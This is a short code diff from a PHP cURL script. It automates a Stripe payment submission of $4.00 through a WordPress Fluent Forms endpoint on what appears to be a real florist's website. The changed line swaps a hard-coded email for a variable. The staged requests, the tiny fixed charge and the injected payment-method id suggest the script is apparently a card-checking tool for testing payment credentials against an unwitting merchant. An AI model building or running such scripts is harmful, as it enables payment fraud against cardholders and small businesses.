@@ -383,7 +383,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D6083%26_fluentform_5_fluentformnonce%3Da9ee744bbc%26_wp_http_referer%3D%252Fcentral-coast-florist%252F%26email%3Dgloosmoke%2540gmail.com%26input_text%3D0817480671%26description_2%3DNY%26description%3DNY%26description_3%3DNY%26payment_input%255B%255D%3D4%2Binch%2B%25244.00%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=5');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D6083%26_fluentform_5_fluentformnonce%3Da9ee744bbc%26_wp_http_referer%3D%252Fcentral-coast-florist%252F%26email%3D'.$email.'%26input_text%3D0817480671%26description_2%3DNY%26description%3DNY%26description_3%3DNY%26payment_input%255B%255D%3D4%2Binch%2B%25244.00%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=5');
 
 
 $result2 = curl_exec($ch);
